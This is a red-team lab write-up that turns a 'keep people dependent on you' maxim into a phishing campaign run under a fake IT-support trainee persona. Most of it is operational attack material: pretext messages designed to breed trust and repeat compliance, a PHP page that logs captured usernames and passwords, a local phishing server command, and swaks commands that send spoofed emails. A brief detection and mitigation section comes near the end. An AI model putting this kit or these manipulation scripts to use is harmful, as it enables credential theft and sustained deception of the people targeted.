## **Law 11 — Learn to Keep People Dependent on You**

Interpretation (offensive context):  
Create a situation where the target **relies on you for access, resolution, or continuity**. Once dependency is established, repeated exploitation becomes trivial.

---

# 🎯 Attack Scenario — _Persistent Access via IT Support Dependency_

You impersonate a support role and position yourself as the **only reliable point of resolution** for recurring issues.

**Persona:**

> _Anna Volkov_, 20 y/o IT Support Trainee

---

# 🔴 Red Team Objective

- Establish **ongoing interaction channel** with target
    
- Achieve:
    
    - repeated credential access
        
    - sensitive information disclosure over time
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Initial Contact (Problem Introduction)

You introduce a **minor issue**:

> “Hi, we’ve detected a sync issue with your account. I’ll help you resolve it.”

👉 You position yourself as:

- helper
    
- authority
    
- solution provider
    

---

## Phase 2 — Controlled Resolution

You provide a **partial fix**:

> “Try logging in here so I can re-sync your profile.”

Link:

```id="p3v7kx"
http://192.168.56.101:8080
```

👉 Target interacts  
👉 You capture credentials

---

## Phase 3 — Dependency Creation

Follow-up:

> “Looks like it partially worked, I’ll monitor this for you.”

👉 Now:

- you’re the “assigned support person”
    
- user trusts future interactions
    

---

## Phase 4 — Re-engagement (Repeat Exploitation)

Later:

> “We’re seeing another sync issue, can you quickly re-authenticate?”

👉 No suspicion:

- same person
    
- same issue
    
- same workflow
    

---

## 🛠️ Tooling + Commands

### 1. Phishing Infrastructure

```bash
php -S 0.0.0.0:8080
```

---

### 2. Credential Capture

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

### 3. Communication Loop (email simulation)

```bash
swaks --to target@corp.local \
--from anna.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Account sync issue

Hi,

We’ve detected a sync issue with your account. I’ll help resolve it.

http://192.168.56.101:8080"
```

---

### 4. Follow-up (critical for dependency)

```bash
swaks --to target@corp.local \
--from anna.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Follow-up

Hi,

Still monitoring your account, we may need another quick check soon."
```

---

## Phase 5 — Expected Result

- Target:
    
    - trusts attacker
        
    - repeatedly complies
        
- Attacker:
    
    - gains **persistent access opportunities**
        

👉 Not a one-time attack  
👉 A **relationship-based exploit**

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Authority establishment**
    
- **Rapport building over time**
    
- **Consistency bias** → repeated behavior becomes normal
    

Key principle:

> Once trust is established, resistance disappears

---

# 🛡️ Detection & Defensive Insight

Indicators:

- repeated requests from same “support identity”
    
- recurring credential prompts
    
- unresolved issues requiring re-authentication
    

Mitigation:

- enforce:
    
    - ticket-based support only
        
- prohibit:
    
    - direct credential requests
        
- log:
    
    - repeated user re-authentication events
        

---

# 📄 Report Artifact

### Title:

> Persistent Credential Access via Induced User Dependency

### Include:

- interaction timeline
    
- multiple email samples
    
- credential capture instances
    
- analysis:
    
    - how dependency reduced suspicion
        
- impact:
    
    - long-term access potential
        

---

# ⚠️ Operator Insight

One-time attacks:

- limited value
    

Dependency-based attacks:

- repeatable
    
- scalable
    
- low effort after setup
    

You’re not just exploiting a user  
You’re **owning the relationship channel**

---

